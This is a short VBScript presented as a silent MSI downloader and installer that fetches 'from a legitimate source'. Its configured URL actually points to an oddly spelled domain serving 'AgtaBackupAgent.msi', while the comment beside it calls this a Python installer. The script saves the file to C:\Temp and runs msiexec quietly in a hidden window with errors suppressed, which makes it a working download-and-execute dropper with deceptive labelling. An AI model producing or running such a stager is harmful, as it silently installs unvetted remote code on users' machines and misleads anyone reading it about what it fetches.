' Silent MSI Downloader and Installer
' This script downloads an MSI from a legitimate source and installs it silently

Dim objWinHttpReq, objFSO, strURL, strMSIPath, strTempFolder, objShell, intStatus

' Configuration - Change these values
strURL = "https://cacgreatchallange.org/AgtaBackupAgent.msi"  ' Example: Python installer
strMSIPath = "C:\Temp\AgtaBackupAgent.msi"  ' Destination path for MSI

' Alternative legitimate sources:
' Python: https://www.python.org/ftp/python/[VERSION]/python-[VERSION]-amd64.msi
' 7-Zip: https://7-zip.org/a/7z[VERSION]-x64.msi
' Node.js: https://nodejs.org/dist/v[VERSION]/node-v[VERSION]-x64.msi
' VLC: https://get.videolan.org/vlc/[VERSION]/win64/vlc-[VERSION]-win64.msi

' Create objects
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
Set objWinHttpReq = CreateObject("MSXML2.XMLHTTP")

' Create temp folder if it doesn't exist
strTempFolder = "C:\Temp"
If Not objFSO.FolderExists(strTempFolder) Then
    objFSO.CreateFolder(strTempFolder)
End If

On Error Resume Next

' Download the MSI file
WScript.Echo "Downloading installer..."
objWinHttpReq.Open "GET", strURL, False
objWinHttpReq.Send

If objWinHttpReq.Status = 200 Then
    ' Write downloaded content to file
    Dim objADOStream
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Type = 1  ' Binary
    objADOStream.Write objWinHttpReq.ResponseBody
    objADOStream.SaveToFile strMSIPath, 2  ' Overwrite if exists
    objADOStream.Close
    
    WScript.Echo "Download complete. Installing..."
    
    ' Install MSI silently
    ' /i = install, /qn = quiet (no UI), /norestart = don't restart
    objShell.Run "msiexec.exe /i """ & strMSIPath & """ /qn /norestart", 0, True
    
    WScript.Echo "Installation complete."
    
    ' Optional: Clean up the downloaded file
    ' objFSO.DeleteFile strMSIPath, True
    
Else
    WScript.Echo "Error: Failed to download file. Status: " & objWinHttpReq.Status
End If

' Clean up
Set objWinHttpReq = Nothing
Set objFSO = Nothing
Set objShell = Nothing
